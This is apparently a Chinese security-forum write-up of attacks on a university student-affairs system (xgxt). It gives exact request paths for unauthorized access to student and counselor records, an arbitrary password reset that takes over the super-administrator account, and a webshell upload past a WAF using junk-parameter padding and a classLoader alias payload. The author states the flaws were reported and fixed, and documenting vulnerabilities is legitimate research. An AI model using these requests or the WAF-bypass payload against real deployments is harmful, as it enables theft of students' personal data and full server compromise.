写在前面
====

下文的所有漏洞都是需要有学校统一门户的账号和密码的情况下才能挖掘出来的，不过我也有挖到个别特殊的学校个例，可以直接未授权访问那些目录页面造成危害。挖掘的案例均已提交至漏洞平台并已经修复。

过程
==

首先登陆统一门户，登录账号密码，找到学工系统页面：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-01108ee0cf9a8c2ca738bd5072de25e229b15d9e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-01108ee0cf9a8c2ca738bd5072de25e229b15d9e.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d8d85fd6cc814b38e29037aaf6d4573723139721.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d8d85fd6cc814b38e29037aaf6d4573723139721.png)

1.越权漏洞：  
访问以下的路径：  
`http://x.x.x.x/xgxt/xsxx_xsgl.do?method=showStudentsAjax&isAll=true`  
然后便可查看所有学生列表：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ddd85259210848cf8577a7cbd77828ab7be50ea4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ddd85259210848cf8577a7cbd77828ab7be50ea4.png)

`http://x.x.x.x/xgxt/general_szdw.do?method=szdwRybb&lx=fdy`  
然后便可查看所有辅导员列表：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-438325d343f8e1a1d45396c9e0399daf306f1b07.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-438325d343f8e1a1d45396c9e0399daf306f1b07.png)

`http://x.x.x.x/xgxt/xsxx_xsgl.do?method=getXsjbxxMore&xh=某学号`  
然后便可以查看该学号的学生的敏感信息：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7a774c2b46a3b789636d1d13deee5dbf01698077.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7a774c2b46a3b789636d1d13deee5dbf01698077.png)

最后根据该漏洞可以编写个脚本，来批量获取系统内用户的敏感信息，效果如下：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-39eec6f47c1f8e966c0bb09857bee997a0c1c5d0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-39eec6f47c1f8e966c0bb09857bee997a0c1c5d0.png)

2.任意密码重置漏洞：  
访问该路径：  
`http://x.x.x.x/xgxt/mmzhgl_mmzh.do?method=xgmm&yhm=想要修改的账号`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d5d4acd472b536bdb469d752b5e4bd345f1d41d3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d5d4acd472b536bdb469d752b5e4bd345f1d41d3.png)

然后可以将系统内置的超级管理员账号的密码重置，我重置为test0123：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-65458b1d0b5aeb794653a15fb17e74fb33009a01.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-65458b1d0b5aeb794653a15fb17e74fb33009a01.png)

然后再退出到`http://x,x,x,x/xgxt/`的学工系统登录页面，重新登录：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cdf6bebead89900da40349a9895bc8f026eaaa2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cdf6bebead89900da40349a9895bc8f026eaaa2b.png)

登录成功：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0e56eb3a63bbe7809dae6c8c7d5fe999f6ae8b9e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0e56eb3a63bbe7809dae6c8c7d5fe999f6ae8b9e.png)

既然是超级管理员，那么便可查看到许多敏感信息了，这里就不截图和赘述了。

3.文件上传漏洞（需要绕过waf的拦截）：  
访问该路径：  
`http://x.x.x.x/xgxt/commXszz.do?method=uploadFile`  
这里我上传的是jspx木马，查看网站页面源代码来获取文件路径：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7a4e475fe85181362bc0cd81e885eead0a3c247a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7a4e475fe85181362bc0cd81e885eead0a3c247a.png)

访问`http://x.x.x.x/xgxt/mmzhgl_mmzh.do?method=checkYh&type=view`，然后用Burp Suite用POST方式填充垃圾字符数据可绕过waf。方法就是利用脚本生成一个垃圾字符数据，或者自己aaaa什么的堆叠一下，因为有些waf要是字节超出了范围，那么就不会检测到堆叠之后的马，同时也可以利用注释符(可用`<!– … –>`来注释)再注释掉脏数据，那么就只剩下马了，waf就绕过了：

```php
method=checkYh&type=view&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&&class.classLoader.resources.dirContext.aliases=/abcd=/upload/xxxx/
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1742abb7b95ec90601e5a63da62606e435492543.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1742abb7b95ec90601e5a63da62606e435492543.png)

然后拼合url，获取木马地址：`http://x.x.x.x/xgxt/abcd/xxx.jspx`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-75eca8717e92796537aa0b89f90e0e86529dc877.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-75eca8717e92796537aa0b89f90e0e86529dc877.png)

至此，完成本次渗透过程。